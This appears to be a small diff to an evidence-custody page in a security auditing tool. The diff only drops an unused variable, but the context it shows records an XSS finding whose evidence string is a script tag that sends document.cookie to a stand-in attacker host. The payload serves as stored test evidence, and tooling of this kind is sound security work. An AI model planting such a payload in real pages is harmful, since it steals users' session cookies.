@@ -92,7 +92,7 @@ export function EvidenceCustodyPage() {
       'audit-crawler'
     );
 
-    const _xssEvidence = await createEvidenceRecord(
+    await createEvidenceRecord(
       'finding-xss-leak-03',
       `<script>fetch('https://attacker.site/log?c=' + document.cookie)</script>`,
       'hunter-agent'
